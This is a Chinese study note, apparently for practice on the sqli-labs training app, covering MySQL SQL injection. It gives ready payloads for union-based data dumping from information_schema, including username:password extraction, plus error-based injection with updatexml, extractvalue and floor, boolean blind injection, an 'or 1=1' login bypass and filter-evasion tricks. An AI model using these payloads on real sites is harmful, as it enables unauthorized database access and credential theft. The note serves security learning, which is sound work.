---
title: SQLi-笔记
published: 2026-09-05
description: A comprehensive guide to SQL injection techniques, including blind SQL injection, error-based injection, and methods for extracting database information.
tags:
  - SQL
  - MySQL
  - web安全
  - SQLi
category: SQL
draft: false
---

```
注释符
-- 和#和/* */
注意-- 和--+的关系
```
---

## 闭合方式判断
**有无括号的判断**
以单引号为例
1. `2'&&'1'='1`
- 若查询语句为`where id='$id'`，查询时是`where id='2'&&'1'='1'`，结果是`where id='2'`，回显会是`id=2`。
- 若查询语句为`where id=('$id')`，查询时是`where id=('2'&&'1'='1')`，MySQL 将`('2'&&'1'='1')`作为了 Bool 值，结果是`where id=('1')`，回显会是`id=1`。

2. `1')||'1'=('1`  
- 若查询语句有小括号则正常回显，`?id=('1')||'1'=('1')`回显id=1
- 注意url中 & 和 | 的使用%26 %7c

## `order by 10` 是什么意思？

`order by N` 是 SQL 里用来**按列排序**的语法，这里的 `N` 代表「按第 N 列排序」，在 SQL 注入里是用来**快速猜解查询列数**的经典手法。
Back:
### 1. 正常 SQL 里的 `order by`

比如：
```sql
SELECT id, name, age FROM users ORDER BY 3;
```

意思是：从 users 表中查询 id、name、age 三列，**按第 3 列（age）排序**。

如果 `ORDER BY 4`，就会报错，因为查询结果只有 3 列，没有第 4 列。

### 2. 注入里用它来猜列数的原理

这就是你图里讲的「二分法猜列数」：

- 当你输入 `order by 10`，如果服务器返回错误（比如 “Unknown column '10' in 'order clause'”），说明查询结果**不足 10 列**。
- 那你再试 `order by 5`，如果没报错，说明列数≥5。
- 再试 `order by 7`，报错了，说明列数在 5-7 之间，再试 `order by 6`……
- 这样用二分法，几次就能试出查询列的总数。

### 3. 为什么要猜列数？

因为**联合查询（union select）必须保证前后两个查询的列数完全一致**。

比如原查询是 2 列，你要执行 `union select 1,2`，如果列数不匹配，SQL 会直接报错，注入就失败了。

所以 `order by` 是 SQL 注入里，做联合查询之前的「必做步骤」。

---

## 公开系统表  information_schema

SQL注入信息收集-公开系统表——information_schema
information_schema是一个数据库,
只公开表面数据，不公开具体数据，
该库下有两个表
### `information_schema.tables`（存储所有表的信息的表）

| 列名             | 含义         |
| :------------- | :--------- |
| `table_schema` | 这个表属于哪个数据库 |
| `table_name`   | 这个表叫什么名字   |
### `information_schema.columns`（存储所有列的信息的表）

| 列名             | 含义         |
| :------------- | :--------- |
| `table_schema` | 这个列属于哪个数据库 |
| `table_name`   | 这个列属于哪张表   |
| `column_name`  | 这个列叫什么名字   |
```sql
(select table_name from information_schema.tables where table_schema=database() limit 0,1)
```
由全局的表，用所属库，来筛出要查询limit 0,1的表名

## MySQL 系统库三件套
| 表名                          | 核心列                                   | 查什么      |
| :-------------------------- | :------------------------------------ | :------- |
| information_schema.schemata | schema_name                           | 所有数据库名   |
| information_schema.tables   | table_schema, table_name              | 某个库的所有表名 |
| information_schema.columns  | table_schema, table_name, column_name | 某个表的所有列名 |


---
## 聚合函数group_concat()的威力

例句：
```sql
SELECT username, password FROM users WHERE id='-1' 
UNION 
SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()
表名一次全拿
```

---

## 查询一条龙
```sql
爆库名
(select group_concat(schema_name) from information_schema.schemata)
```
```sql
爆表名
(select group_concat(table_name) from information_schema.tables where table_schema='库名')
```
```sql
爆列名
(select group_concat(column_name) from information_schema.columns where table_name='表名')
```
```sql
爆数据
(select group_concat(列名) from 表名)
(select group_concat(username,':',password) from users)
```
## MySQL自带函数库
#### 测长度`substr('security', 1, 1)`
`substr(字符串, 起始位置, 截取长度)` 是 MySQL 标准语法。  
意思是：从第 1 个字符开始，取 1 个字符。  
所以，`substr('security', 1, 1)` 的结果是 `s`。
#### 量范围`ascii('s')`
`ascii(字符)` 返回这个字符的 ASCII 码数字。  
字母 `s` 的 ASCII 码是 `115`。  
所以，`ascii('s')` 的结果是数字 `115`。

---

## 报错注入

什么是XML？什么是XPath？先打通sqli-labs, 通常用and接,因为要报错使其回显
Back: 

**使用updatexml()函数**

```sql
爆库名
?id=1' and updatexml(1, concat(0x7e, database(),0x7e), 1)--+
```

```sql
爆表名（一次性全出来）
?id=1' and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e), 1)--+
```

```sql
爆列名
?id=1' and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e), 1)--+
```
核心结构：and updatexml(1,concat(0x7e,(查询语句),0x7e),1)

**使用extractvalue()函数**

**原始功能：**
extractvalue(目标XML, 查询路径)
从一段 XML 里，按 XPath 路径把对应的值取出来。

**报错注入用法：**
```sql
?id=1' and extractvalue(1, concat(0x7e, (查询语句),0x7e)--+
```
它俩的致命缺陷：都**只能显示 32** 个字符，但是可用substr截取再拼接，获得目标字符串

使用floor()函数
```sql
?id=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),(查询语句)) as x from information_schema.tables group by x) as a)--+
```
核心结构：**concat( floor(rand(0)\*2), (你的查询语句) )**


---
## 布尔盲注

(基于sqli-lab Less-7)

逻辑：**通过页面反应判断真假**。
      页面正常（有 “You are in...” 或特定内容）为真，页面异常（空、错误）为假。
特点:  **无回显、无报错**的明确信息

**1. 判断数据库名长度**

`?id=1')) and (length(database())>1)--+`

如果页面正常，说明长度大于 1。  
改成 `>10` 如果页面错误，说明长度在 2~10 之间。  
用二分法逼近真实长度。

**2. 猜解库名的一个字母**

`?id=1')) and (ascii(substr(database(),1,1))>100)--+`

通过不断调整 `>100` 这个值，定位到具体 ASCII 码，从而得出第一个字母。

**3. 爆表数量**，可以用：

`?id=1')) and (select count(table_name) from information_schema.tables where table_schema=database() )=4--+`

页面正常就说明有 4 个表。通过不断调整,确定数量

**4. 判断表名长度**

`?id=1')) and (length( #(select table_name from information_schema.tables where table_schema=database() limit 0,1)# )>1)--+`

**5. 猜解表名的一个字母**

`?id=1')) and (ascii(substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))>100)--+`

**6. 爆列数量**，可以用：

`?id=1')) and (select count(column_name) from information_schema.columns where table_schema=database() )=4--+`

## 理解post闭合,注释手段

post反而不用--+，用#

**`or 1=1` 的核心作用就是：让整个 WHERE 条件永远为真，即使原本查询条件（比如 `uname='1'`）不匹配任何记录，数据库也会因为 `1=1` 而返回表中的某一行数据（通常是第一条）。**

**当界面符合预期就意味着 “payload 成功的可能就更近目标了”**

1. **验证注入点存在**  
    正常输入 `uname="1"` 可能返回空或错误，但加上 `or 1=1` 后页面突然正常登录或显示数据 → 说明你的输入影响了原 SQL 逻辑，**注入点确认存在**。
    
2. **绕过第一道防线**  
    登录框场景下，这个 payload 可以直接进入后台（以第一个用户身份），属于高风险漏洞。
    
3. **为下一步数据提取铺路**  
    一旦验证了 `or 1=1` 有效，你就可以尝试：
    
    - 联合查询：`"1" union select 1,2,3#`
        
    - 报错注入：`"1" and updatexml(1,concat(0x7e,database()),1)#`
        
    - 盲注条件：`"1" and ascii(substr(database(),1,1))>100#`
        

**所以 “or 1=1” 就像一把万能钥匙：不关心具体用户是谁，只要门能开，就说明锁有问题。接下来就可以换更精细的工具（union、盲注等）去掏空数据库。**

另外当知道or 1=1符合预期时,可换精细工具,盲注语句可替换1=1

## 过滤
1. or，and，空格绕过
 因为空格失效，所以oorr这样的双写绕过也是无效的
- 使用两个空格替代空格
    
- 用注释/\**/替换空格
    
- 用Tab键代替空格
    
- 回车%a0=空格
    
- `%20 %09 %0a %0b %0c %0d %a0 %00`
    
- 括号()绕过空格:括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。
- ||(%7c)和&&(%26)分别代替or和and
